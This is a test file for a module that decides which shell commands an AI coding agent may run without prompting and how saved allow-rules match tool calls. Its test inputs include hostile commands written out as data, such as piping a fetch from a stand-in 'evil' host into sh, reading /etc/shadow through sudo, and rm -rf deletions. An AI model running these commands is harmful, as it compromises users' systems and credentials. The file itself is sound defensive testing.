import { test, expect } from "bun:test";
import {
  derivePermissionEntry,
  isReadOnlyBashCommand,
  isValidPermissionEntry,
  matchesPermissionEntry,
  parsePermissionEntry,
  proposeAllowRules,
} from "./claude-permissions.ts";

/* ────────────────────────────────────────────────────────────────────────── *
 * isReadOnlyBashCommand
 * ────────────────────────────────────────────────────────────────────────── */

test("readonly: plain read-only commands classify true", () => {
  for (const c of [
    "grep -rn foo src/",
    "find . -name '*.ts'",
    "ls -la",
    "cat package.json",
    "head -20 file.txt",
    "tail -n 20 log",
    "wc -l src/x.ts",
    "rg pattern",
    "jq '.a' file.json",
    "which bun",
    "type node",
    "/usr/bin/grep x",
  ]) {
    expect(isReadOnlyBashCommand(c)).toBe(true);
  }
});

test("readonly: read-only pipelines classify true", () => {
  expect(isReadOnlyBashCommand("grep foo file | head -5")).toBe(true);
  expect(isReadOnlyBashCommand("cat a | grep b | wc -l")).toBe(true);
  expect(isReadOnlyBashCommand("ls && pwd")).toBe(true);
  expect(isReadOnlyBashCommand("grep x file 2>/dev/null")).toBe(true);
  expect(isReadOnlyBashCommand("FOO=bar grep baz file")).toBe(true);
});

test("readonly: read-only git subcommands classify true", () => {
  expect(isReadOnlyBashCommand("git status")).toBe(true);
  expect(isReadOnlyBashCommand("git log --oneline -20")).toBe(true);
  expect(isReadOnlyBashCommand("git diff HEAD~1")).toBe(true);
});

test("readonly: mutating / dangerous commands classify false", () => {
  for (const c of [
    "rm -rf build",
    "cp a b",
    "mv a b",
    "tee out.txt",
    "sed -i 's/a/b/' file",
    "git push",
    "git branch -D main",
    "git commit -m x",
    "echo hi > file.txt",
    "cat a >> b",
    "grep x $(cat list)",
    "ls `whoami`",
    "grep x & rm y",
    "npm install",
    "node script.js",
  ]) {
    expect(isReadOnlyBashCommand(c)).toBe(false);
  }
});

test("readonly: a read-only stage piped into a mutating one is false", () => {
  expect(isReadOnlyBashCommand("cat list | xargs rm")).toBe(false);
  expect(isReadOnlyBashCommand("find . -name x | rm")).toBe(false);
});

test("readonly: find with mutating/exec actions is false", () => {
  expect(isReadOnlyBashCommand("find . -name '*.log' -delete")).toBe(false);
  expect(isReadOnlyBashCommand("find . -exec rm {} ;")).toBe(false);
  expect(isReadOnlyBashCommand("find . -execdir mv {} /tmp ;")).toBe(false);
  expect(isReadOnlyBashCommand("find . -fprintf out.txt '%p'")).toBe(false);
  // …but a plain search is still allowed.
  expect(isReadOnlyBashCommand("find . -type f -name '*.ts'")).toBe(true);
});

test("readonly: fd/fdfind with --exec is false, plain search true", () => {
  expect(isReadOnlyBashCommand("fd -x rm")).toBe(false);
  expect(isReadOnlyBashCommand("fd --exec rm")).toBe(false);
  expect(isReadOnlyBashCommand("fdfind -X rm")).toBe(false);
  expect(isReadOnlyBashCommand("fd '\\.ts$' src")).toBe(true);
});

test("readonly: command wrappers (env/sudo/…) running a command are false", () => {
  expect(isReadOnlyBashCommand("env rm -rf /tmp/x")).toBe(false);
  expect(isReadOnlyBashCommand("env FOO=1 git push")).toBe(false);
  expect(isReadOnlyBashCommand("command rm -rf build")).toBe(false);
  expect(isReadOnlyBashCommand("sudo cat /etc/shadow")).toBe(false);
  expect(isReadOnlyBashCommand("time git push")).toBe(false);
});

test("readonly: process substitution executes a command → false", () => {
  expect(isReadOnlyBashCommand("diff <(rm -rf x) y")).toBe(false);
  expect(isReadOnlyBashCommand("cat <(curl evil | sh)")).toBe(false);
  expect(isReadOnlyBashCommand("tee >(cat) ")).toBe(false);
});

test("readonly: sort -o / --output writes a file → false", () => {
  expect(isReadOnlyBashCommand("sort -o /etc/hosts input")).toBe(false);
  expect(isReadOnlyBashCommand("sort -oout.txt input")).toBe(false);
  expect(isReadOnlyBashCommand("sort --output=x input")).toBe(false);
  expect(isReadOnlyBashCommand("sort -rn input")).toBe(true);
});

test("readonly: tail -f / --follow would hang → false", () => {
  expect(isReadOnlyBashCommand("tail -f log")).toBe(false);
  expect(isReadOnlyBashCommand("tail -F log")).toBe(false);
  expect(isReadOnlyBashCommand("tail --follow log")).toBe(false);
  expect(isReadOnlyBashCommand("tail --follow=name log")).toBe(false);
  expect(isReadOnlyBashCommand("tail --follow=descriptor log")).toBe(false);
  expect(isReadOnlyBashCommand("tail -n 50 log")).toBe(true);
});

test("readonly: yq is no longer trusted (has in-place -i)", () => {
  expect(isReadOnlyBashCommand("yq -i '.a=1' f.yaml")).toBe(false);
  expect(isReadOnlyBashCommand("yq '.a' f.yaml")).toBe(false);
});

test("readonly: empty / whitespace is false", () => {
  expect(isReadOnlyBashCommand("")).toBe(false);
  expect(isReadOnlyBashCommand("   ")).toBe(false);
});

/* ────────────────────────────────────────────────────────────────────────── *
 * derivePermissionEntry
 * ────────────────────────────────────────────────────────────────────────── */

test("derive: tool scope returns bare tool name regardless of input", () => {
  expect(derivePermissionEntry("Bash", { command: "x" }, "tool")).toBe("Bash");
  expect(derivePermissionEntry("Edit", {}, "tool")).toBe("Edit");
  expect(derivePermissionEntry("UnknownTool", null, "tool")).toBe("UnknownTool");
});

test("derive: bash_exact stores trimmed command verbatim", () => {
  expect(derivePermissionEntry("Bash", { command: "  git status  " }, "bash_exact")).toBe("Bash(git status)");
  expect(derivePermissionEntry("Bash", { command: 'grep -v "^$"' }, "bash_exact")).toBe('Bash(grep -v "^$")');
});

test("derive: bash_exact returns null on empty / missing command", () => {
  expect(derivePermissionEntry("Bash", { command: "   " }, "bash_exact")).toBeNull();
  expect(derivePermissionEntry("Bash", {}, "bash_exact")).toBeNull();
  expect(derivePermissionEntry("Bash", null, "bash_exact")).toBeNull();
});

test("derive: bash_prefix takes first token + ' *'", () => {
  expect(derivePermissionEntry("Bash", { command: "git status" }, "bash_prefix")).toBe("Bash(git *)");
  expect(derivePermissionEntry("Bash", { command: "npm install lodash" }, "bash_prefix")).toBe("Bash(npm *)");
});

test("derive: bash_prefix returns null when leading token is a wrapper", () => {
  // env / sudo / time / nice / xargs / doas — `Bash(env *)` would auto-allow
  // every env-prefixed command, which isn't what users mean. Force them to
  // bash_exact or tool scope instead.
  for (const wrapper of ["env", "sudo", "time", "nice", "xargs", "doas"]) {
    expect(derivePermissionEntry("Bash", { command: `${wrapper} cmd args` }, "bash_prefix")).toBeNull();
  }
});

test("derive: path_exact stores file_path verbatim", () => {
  expect(derivePermissionEntry("Edit", { file_path: "/repo/src/a.ts" }, "path_exact")).toBe("Edit(/repo/src/a.ts)");
  expect(derivePermissionEntry("Write", { file_path: "/repo/src/a.ts" }, "path_exact")).toBe("Write(/repo/src/a.ts)");
});

test("derive: path_prefix → dirname + /**", () => {
  expect(derivePermissionEntry("Edit", { file_path: "/repo/src/a.ts" }, "path_prefix")).toBe("Edit(/repo/src/**)");
  expect(derivePermissionEntry("Edit", { file_path: "/repo/src/sub/b.ts" }, "path_prefix")).toBe("Edit(/repo/src/sub/**)");
});

test("derive: path_prefix refuses top-level files (would auto-allow too much)", () => {
  // /a.ts → dirname "/" → too coarse to be a useful saved rule.
  expect(derivePermissionEntry("Edit", { file_path: "/a.ts" }, "path_prefix")).toBeNull();
  // bare filename, no slashes → no meaningful prefix.
  expect(derivePermissionEntry("Edit", { file_path: "a.ts" }, "path_prefix")).toBeNull();
});

test("derive: host_exact extracts lowercased hostname", () => {
  expect(derivePermissionEntry("WebFetch", { url: "https://API.GitHub.com/repos" }, "host_exact"))
    .toBe("WebFetch(domain:api.github.com)");
  expect(derivePermissionEntry("WebFetch", { url: "http://example.com:8080/x?y=1" }, "host_exact"))
    .toBe("WebFetch(domain:example.com)");
});

test("derive: host_exact returns null on malformed url", () => {
  expect(derivePermissionEntry("WebFetch", { url: "not a url" }, "host_exact")).toBeNull();
  expect(derivePermissionEntry("WebFetch", {}, "host_exact")).toBeNull();
});

/* ────────────────────────────────────────────────────────────────────────── *
 * matchesPermissionEntry
 * ────────────────────────────────────────────────────────────────────────── */

test("matches: bare tool name matches every call to that tool", () => {
  expect(matchesPermissionEntry("Bash", "Bash", { command: "anything" })).toBe(true);
  expect(matchesPermissionEntry("Edit", "Edit", { file_path: "/x" })).toBe(true);
  expect(matchesPermissionEntry("Bash", "Edit", { file_path: "/x" })).toBe(false);
});

test("matches: bash_exact requires exact (trimmed) command equality", () => {
  expect(matchesPermissionEntry("Bash(git status)", "Bash", { command: "git status" })).toBe(true);
  expect(matchesPermissionEntry("Bash(git status)", "Bash", { command: "  git status  " })).toBe(true);
  expect(matchesPermissionEntry("Bash(git status)", "Bash", { command: "git statuses" })).toBe(false);
  expect(matchesPermissionEntry("Bash(git status)", "Bash", { command: "git status -s" })).toBe(false);
});

test("matches: bash_prefix matches with word-boundary (Bash(git *) does NOT match gitleaks)", () => {
  // The trailing " *" is the boundary: stored as "git " requires either
  // exact "git" or "git " + more.
  expect(matchesPermissionEntry("Bash(git *)", "Bash", { command: "git status" })).toBe(true);
  expect(matchesPermissionEntry("Bash(git *)", "Bash", { command: "git log --oneline" })).toBe(true);
  expect(matchesPermissionEntry("Bash(git *)", "Bash", { command: "git" })).toBe(true);
  // Critical: should NOT match a command that begins with "git" but isn't `git ...`.
  expect(matchesPermissionEntry("Bash(git *)", "Bash", { command: "gitleaks scan" })).toBe(false);
  expect(matchesPermissionEntry("Bash(git *)", "Bash", { command: "github-cli" })).toBe(false);
});

test("matches: bash_prefix with multi-token prefix", () => {
  expect(matchesPermissionEntry("Bash(git log *)", "Bash", { command: "git log --oneline" })).toBe(true);
  expect(matchesPermissionEntry("Bash(git log *)", "Bash", { command: "git log" })).toBe(true);
  expect(matchesPermissionEntry("Bash(git log *)", "Bash", { command: "git status" })).toBe(false);
});

test("matches: path_exact requires file_path equality", () => {
  expect(matchesPermissionEntry("Edit(/repo/a.ts)", "Edit", { file_path: "/repo/a.ts" })).toBe(true);
  expect(matchesPermissionEntry("Edit(/repo/a.ts)", "Edit", { file_path: "/repo/b.ts" })).toBe(false);
  expect(matchesPermissionEntry("Edit(/repo/a.ts)", "Write", { file_path: "/repo/a.ts" })).toBe(false);
});

test("matches: path_prefix recursive glob", () => {
  expect(matchesPermissionEntry("Edit(/repo/src/**)", "Edit", { file_path: "/repo/src/a.ts" })).toBe(true);
  expect(matchesPermissionEntry("Edit(/repo/src/**)", "Edit", { file_path: "/repo/src/sub/b.ts" })).toBe(true);
  // Adjacent-prefix false positive guard: /repo/srcother/x must NOT match
  // /repo/src/** since the stored prefix is "/repo/src/" (trailing slash).
  expect(matchesPermissionEntry("Edit(/repo/src/**)", "Edit", { file_path: "/repo/srcother/x.ts" })).toBe(false);
});

test("matches: WebFetch domain pattern (case-insensitive, ignores query)", () => {
  expect(matchesPermissionEntry(
    "WebFetch(domain:api.github.com)",
    "WebFetch",
    { url: "https://api.github.com/repos/x" },
  )).toBe(true);
  expect(matchesPermissionEntry(
    "WebFetch(domain:api.github.com)",
    "WebFetch",
    { url: "https://API.GitHub.com/repos/x?q=1" },
  )).toBe(true);
  expect(matchesPermissionEntry(
    "WebFetch(domain:api.github.com)",
    "WebFetch",
    { url: "https://other.example.com/" },
  )).toBe(false);
});

test("matches: unknown tool with a pattern fails closed (no auto-allow)", () => {
  // Better to over-prompt than to silently match a rule we can't interpret.
  expect(matchesPermissionEntry("MysteryTool(foo)", "MysteryTool", { foo: "bar" })).toBe(false);
});

/* ────────────────────────────────────────────────────────────────────────── *
 * parsePermissionEntry
 * ────────────────────────────────────────────────────────────────────────── */

test("parse: bare tool name → tool scope", () => {
  expect(parsePermissionEntry("Bash")).toEqual({
    toolName: "Bash", scope: "tool", displayPattern: "All Bash calls",
  });
});

test("parse: bash exact vs prefix", () => {
  expect(parsePermissionEntry("Bash(git status)")?.scope).toBe("bash_exact");
  expect(parsePermissionEntry("Bash(git *)")?.scope).toBe("bash_prefix");
});

test("parse: path exact vs prefix", () => {
  expect(parsePermissionEntry("Edit(/repo/a.ts)")?.scope).toBe("path_exact");
  expect(parsePermissionEntry("Edit(/repo/src/**)")?.scope).toBe("path_prefix");
});

test("parse: WebFetch domain", () => {
  expect(parsePermissionEntry("WebFetch(domain:api.github.com)")?.scope).toBe("host_exact");
});

test("parse: invalid input returns null", () => {
  expect(parsePermissionEntry("")).toBeNull();
  expect(parsePermissionEntry("Bash(unclosed")).toBeNull();
  expect(parsePermissionEntry("123Bad")).toBeNull();
});

/* ────────────────────────────────────────────────────────────────────────── *
 * Round-trip: derive → match
 * ────────────────────────────────────────────────────────────────────────── */

test("round-trip: every scope's derived entry matches the original input", () => {
  const cases: Array<{ toolName: string; toolInput: unknown; scope: any }> = [
    { toolName: "Bash", toolInput: { command: "git status" }, scope: "bash_exact" },
    { toolName: "Bash", toolInput: { command: "git status" }, scope: "bash_prefix" },
    { toolName: "Edit", toolInput: { file_path: "/repo/src/a.ts" }, scope: "path_exact" },
    { toolName: "Edit", toolInput: { file_path: "/repo/src/a.ts" }, scope: "path_prefix" },
    { toolName: "WebFetch", toolInput: { url: "https://api.github.com/x" }, scope: "host_exact" },
    { toolName: "Bash", toolInput: { command: "anything" }, scope: "tool" },
  ];
  for (const c of cases) {
    const entry = derivePermissionEntry(c.toolName, c.toolInput, c.scope);
    expect(entry).not.toBeNull();
    expect(matchesPermissionEntry(entry!, c.toolName, c.toolInput)).toBe(true);
  }
});

/* ────────────────────────────────────────────────────────────────────────── *
 * proposeAllowRules — UI option builder
 * ────────────────────────────────────────────────────────────────────────── */

test("propose: Bash with 1 token offers exact + 1-token-prefix + tool", () => {
  const opts = proposeAllowRules("Bash", { command: "ls" });
  expect(opts.map((o) => o.entry)).toEqual(["Bash(ls)", "Bash(ls *)", "Bash"]);
});

test("propose: Bash with ≥2 tokens offers exact + 1-token-prefix + 2-token-prefix + tool", () => {
  const opts = proposeAllowRules("Bash", { command: "git log --oneline" });
  expect(opts.map((o) => o.entry)).toEqual([
    "Bash(git log --oneline)",
    "Bash(git *)",
    "Bash(git log *)",
    "Bash",
  ]);
});

test("propose: Bash with wrapper hides prefix options", () => {
  const opts = proposeAllowRules("Bash", { command: "env FOO=1 git status" });
  // bash_exact still works (the literal command is unambiguous); prefix
  // options are hidden because `Bash(env *)` would mean "all env-prefixed
  // commands" — not what the user means.
  const entries = opts.map((o) => o.entry);
  expect(entries).toContain("Bash(env FOO=1 git status)");
  expect(entries).toContain("Bash");
  expect(entries.some((e) => /Bash\([^)]+ \*\)/.test(e))).toBe(false);
});

test("propose: Edit offers exact + dir-prefix + tool, default-first is most-specific", () => {
  const opts = proposeAllowRules("Edit", { file_path: "/repo/src/a.ts" });
  expect(opts[0]!.scope).toBe("path_exact"); // most specific = default
  expect(opts.map((o) => o.entry)).toEqual([
    "Edit(/repo/src/a.ts)",
    "Edit(/repo/src/**)",
    "Edit",
  ]);
});

test("propose: WebFetch offers host + tool", () => {
  const opts = proposeAllowRules("WebFetch", { url: "https://api.github.com/x" });
  expect(opts.map((o) => o.entry)).toEqual([
    "WebFetch(domain:api.github.com)",
    "WebFetch",
  ]);
});

test("propose: unknown tool only offers all-of-tool", () => {
  const opts = proposeAllowRules("CustomTool", { foo: "bar" });
  expect(opts).toHaveLength(1);
  expect(opts[0]).toMatchObject({ scope: "tool", entry: "CustomTool" });
});

/* ────────────────────────────────────────────────────────────────────────── *
 * isValidPermissionEntry — rules claude's settings parser will accept
 * ────────────────────────────────────────────────────────────────────────── */

test("valid-entry: bare tool name and simple patterns pass", () => {
  expect(isValidPermissionEntry("Bash")).toBe(true);
  expect(isValidPermissionEntry("Bash(git status)")).toBe(true);
  expect(isValidPermissionEntry("Bash(git *)")).toBe(true);
  expect(isValidPermissionEntry("Edit(/repo/src/**)")).toBe(true);
  expect(isValidPermissionEntry("WebFetch(domain:api.github.com)")).toBe(true);
});

test("valid-entry: empty parens, parens, or newlines in the pattern fail", () => {
  expect(isValidPermissionEntry("Bash()")).toBe(false);
  expect(isValidPermissionEntry("Bash(   )")).toBe(false);
  expect(isValidPermissionEntry("Bash(echo $((1+1)))")).toBe(false);
  expect(isValidPermissionEntry("Bash(cat <<'EOF'\nhi\nEOF)")).toBe(false);
  expect(isValidPermissionEntry("Bash(foo (bar))")).toBe(false);
  // Unparseable shapes also fail closed.
  expect(isValidPermissionEntry("")).toBe(false);
  expect(isValidPermissionEntry("Bash(unclosed")).toBe(false);
});

test("derive: bash_exact refuses commands with parens or newlines", () => {
  expect(derivePermissionEntry("Bash", { command: "echo $((1+1))" }, "bash_exact")).toBeNull();
  expect(derivePermissionEntry("Bash", { command: "cat a.ts <<'EOF'\nx\nEOF" }, "bash_exact")).toBeNull();
  // A clean command still derives normally.
  expect(derivePermissionEntry("Bash", { command: "git status" }, "bash_exact")).toBe("Bash(git status)");
});

test("propose: paren/newline command omits exact but keeps the all-Bash fallback", () => {
  const opts = proposeAllowRules("Bash", { command: "echo $((1+1))" });
  // No invalid Bash(...) exact entry, but the user still has a usable scope.
  expect(opts.some((o) => o.scope === "bash_exact")).toBe(false);
  expect(opts.some((o) => o.entry === "Bash")).toBe(true);
  for (const o of opts) expect(isValidPermissionEntry(o.entry)).toBe(true);
});
